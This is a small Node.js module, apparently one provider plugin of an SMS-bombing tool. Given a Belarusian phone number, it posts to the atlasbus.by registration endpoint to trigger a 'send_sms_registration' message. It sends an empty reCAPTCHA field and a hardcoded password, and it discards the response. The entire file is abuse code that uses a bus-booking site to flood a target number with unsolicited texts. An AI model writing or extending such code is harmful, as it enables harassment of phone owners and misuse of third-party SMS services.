const request = require("request");

module.exports.run = function(number){
if(number.toString().startsWith('375')){
	var formatted_number = number.toString().slice(3).replace(/^(\d{2})(\d{3})(\d{2})(\d{2})$/, '+375($1)$2-$3-$4')
	request.post({
		url:'https://atlasbus.by/local/components/route/user.auth/templates/.default/ajax.php',
			form: {
				"type": "send_sms_registration",
				"data":`phone=${formatted_number}&user_pass=nikak52N12&g-recaptcha-response=&remember=on&sms_registration=&user_pass_new=&user_pass_new_conf=&remember_reg=on&sms_recall=&new_pass=&new_pass_conf=`}
			}, 
			function(err,httpResponse,body){
				/**/
			}
		)
}
}
